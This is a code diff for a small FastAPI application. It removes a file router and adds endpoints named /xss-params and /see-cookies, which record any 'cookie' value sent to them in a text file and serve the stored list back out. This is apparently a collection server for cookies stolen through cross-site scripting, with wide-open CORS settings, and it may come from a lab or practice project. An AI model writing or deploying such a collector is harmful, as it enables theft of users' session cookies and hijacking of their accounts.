@@ -1,13 +1,12 @@
 from fastapi import FastAPI
 from pydantic import BaseModel
-from routers import restaurant, file
+from routers import restaurant
 from fastapi.middleware.cors import CORSMiddleware
-
+import json
 
 app = FastAPI()
 
 app.include_router(restaurant.router)
-app.include_router(file.router)
 
 @app.get("/")
 async def root():
@@ -24,3 +23,19 @@ app.add_middleware(
     allow_methods = ["*"],
     allow_headers = ["*"],
 )
+
+@app.get("/hello")
+async def hello():
+    return {"helloooo"}
+
+@app.get("/xss-params")
+async def xss(cookie:str):
+    f = open("xss-cookie.txt", "a")
+    f.write(f"cookies : {cookie} \n")
+    f.close()
+    return {f"cookies : {cookie}"}
+
+@app.get("/see-cookies")
+async def seecookie():
+    f = open("xss-cookie.txt", "r")
+    return {f.read()}
